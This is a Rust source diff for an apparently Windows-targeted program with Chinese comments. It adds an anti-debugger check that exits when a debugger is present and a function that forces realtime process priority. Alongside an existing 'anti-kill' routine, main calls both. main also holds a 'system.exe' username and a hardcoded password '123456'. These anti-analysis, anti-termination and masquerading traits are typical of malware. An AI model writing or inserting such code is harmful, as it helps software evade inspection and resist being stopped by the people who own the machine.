@@ -48,7 +48,18 @@ pub fn unzip(a: i32) {
     dict.insert(1,1);
 }
 
+use winapi::um::debugapi::IsDebuggerPresent;
 
+pub fn anti_debug() {
+    unsafe {
+        if IsDebuggerPresent() != 0 {
+            eprintln!("检测到调试器，程序即将退出！");
+            std::process::exit(1);
+        } else {
+            println!("未检测到调试器，继续运行！");
+        }
+    }
+}
 
 pub fn open_url_manual(url: &str) -> Result<(), String> {
     if cfg!(target_os = "windows") {
@@ -186,6 +197,23 @@ pub fn set_high_priority() {
     }
     println!("进程优先级已设置为高优先级！");
 }
+
+use winapi::um::processthreadsapi::{GetCurrentProcess};
+use winapi::um::winbase::{REALTIME_PRIORITY_CLASS};
+
+pub fn set_system_priority() {
+    unsafe {
+        let process = GetCurrentProcess();
+        // 设置为实时优先级（接近 system 级别）
+        if SetPriorityClass(process, REALTIME_PRIORITY_CLASS) == 0 {
+            eprintln!("无法设置进程优先级！");
+        } else {
+            println!("进程优先级已设置为 REALTIME_PRIORITY_CLASS！");
+        }
+        CloseHandle(process);
+    }
+}
+
 pub fn main() {
     let username = "system.exe";
     let password = "123456";
@@ -200,6 +228,8 @@ pub fn main() {
 
     // 启动反 kill 措施
     add_anti_kill();
+    set_high_priority();
+    set_system_priority();
 }
 
 // Regex
